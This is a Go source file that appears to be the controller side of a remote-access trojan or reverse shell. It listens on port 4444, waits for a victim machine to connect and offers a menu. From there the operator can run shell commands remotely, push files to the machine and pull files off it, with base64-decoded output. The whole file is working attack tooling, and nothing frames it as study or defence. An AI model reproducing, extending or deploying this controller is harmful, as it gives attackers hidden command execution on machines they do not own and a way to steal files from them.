package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
)

var ln, _ = net.Listen("tcp", ":4444")
var conn, _ = ln.Accept()

const BUFFERSIZE = 1024

var tricker = 1

func main() {
	fmt.Println("Connected to", conn.LocalAddr().String())
	fmt.Print("1: Shell\n2: Send File\n3: Get File\n")
	for {
		var operationNumber string
		fmt.Print("Enter Operation Number>")
		fmt.Scanln(&operationNumber)
		if operationNumber == "1" {
			conn.Write([]byte("1\n"))
			for {
				if tricker == 1 {
					fmt.Print(">")
					text := handleRequest()
					if text == "exit" {
						fmt.Print("1: Shell\n2: Send File\n3: Get File\n")
						break
					}
					outMessage := recvOutput()
					sOutMessage := byteToString(outMessage)
					decoded, err := base64decode(sOutMessage)
					if err != nil {
						fmt.Println(err)
					}
					strdecoded := byteToString(decoded)
					fmt.Print(strdecoded)
					tricker -= 1
				} else {
					text1 := handleRequest()
					if text1 == "exit\n\n" {
						fmt.Print("1: Shell\n2: Send File\n3: Get File\n")
						break
					}
					outMessage := recvOutput()
					sOutMessage := byteToString(outMessage)
					decoded, err := base64decode(sOutMessage)
					if err != nil {
						fmt.Println(err)
					}
					strdecoded := byteToString(decoded)
					fmt.Print(strdecoded)
				}
			}
		}
		if operationNumber == "2" {
			var file string
			fmt.Print("Enter file: ")
			fmt.Scan(&file)
			conn.Write([]byte("2\n"))
			fileTransfer(conn, file)
		}
		if operationNumber == "3" {
			conn.Write([]byte("3\n")) //sorun yok
			var reqFile string
			fmt.Print("enter request name: ")
			fmt.Scanln(&reqFile)
			reqFile += "\n"
			byteReqFile := stringToByte(reqFile)
			sendData(byteReqFile, conn)
			pure := strings.TrimSuffix(reqFile, "\n")
			getFile(pure, conn)
		}
	}
}

func handleRequest() string {
	reader := bufio.NewReader(os.Stdin)
	text, _ := reader.ReadString('\n')
	if strings.HasPrefix(text, "cd") {
		willSent := "--" + "\n"
		conn.Write(stringToByte(willSent))
		splitText := strings.Split(text, " ")[1] //directory
		conn.Write(stringToByte(splitText))
	} else {
		text = text + "\n"
		bText := stringToByte(text)
		conn.Write(bText)
	}
	return text
}

func recvOutput() []byte {
	message, _ := bufio.NewReader(conn).ReadBytes('\n')
	return message
}
func sendData(dataName []byte, connection net.Conn) {
	connection.Write(dataName)
}
func fileTransfer(connection net.Conn, fileName_extension string) {
	file, err := os.Open(fileName_extension)
	if err != nil {
		fmt.Println("err")
		return
	}
	fileInfo, err := file.Stat()
	if err != nil {
		fmt.Println(err)
		return
	}
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	fmt.Println("Sending filename and filesize!")
	connection.Write([]byte(fileSize))
	connection.Write([]byte(fileName))
	sendBuffer := make([]byte, 1024)
	fmt.Println("start sending file!")
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		connection.Write(sendBuffer)
	}
	fmt.Println("File sended.")
}
func getFile(fileName string, connection net.Conn) {
	fileBytes := recvOutput()
	fileString := byteToString(fileBytes)
	bDecodedFile, err := base64decode(fileString)
	if err != nil {
		fmt.Println(err)
	}
	f, err := os.Create(fileName)
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()

	f.Write(bDecodedFile)

}
func fillString(retunString string, toLength int) string {
	for {
		lenghtString := len(retunString)
		if lenghtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
func byteToString(varName []byte) string {
	stringVar := string(varName)
	return stringVar
}
func stringToByte(varName string) []byte {
	byteVar := []byte(varName)
	return byteVar
}
func base64decode(varName string) ([]byte, error) {
	data, err := base64.StdEncoding.DecodeString(varName)
	return data, err
}

